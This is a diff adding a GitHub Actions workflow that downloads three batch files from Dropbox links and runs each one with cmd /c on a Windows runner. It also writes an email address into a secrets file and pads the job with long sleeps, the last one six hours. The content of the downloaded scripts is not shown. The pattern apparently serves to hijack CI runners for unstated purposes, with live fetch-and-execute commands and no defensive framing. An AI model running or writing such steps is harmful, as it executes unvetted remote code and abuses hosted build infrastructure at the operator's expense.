@@ -1,0 +1,52 @@
+name: A6
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3fv6r025lzn92gv6atbbu/down.bat?rlkey=ti46bzfu0kss1kvcoazxe7iab&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+
+      - name: A
+        run: Start-sleep -Seconds 600
+
+      - name: Download
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/43dl2unusgs8pntd3rylw/down1.bat?rlkey=wtrqxg32ipgmxyzdgkslto8i0&dl=1" -OutFile "down1.bat"
+         cmd /c down1.bat
+
+      - name: B
+        run: Start-sleep -Seconds 600
+
+      - name: Download
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/wwb8fs5smui3hfvggslz7/down2.bat?rlkey=whqgunhudkd7hohc78xmnz6nk&dl=1" -OutFile "down2.bat"
+         cmd /c down2.bat
+
+      - name: C
+        run: Start-sleep -Seconds 600
+
+      - name: D
+        run: Start-sleep -Seconds 600
+
+      - name: E
+        run: Start-sleep -Seconds 600
+
+      - name: F
+        run: Start-sleep -Seconds 600
+
+      - name: G
+        run: Start-sleep -Seconds 600
+
+      - name: H
+        run: Start-sleep -Seconds 600
+
+      - name: I
+        run: Start-sleep -Seconds 21600
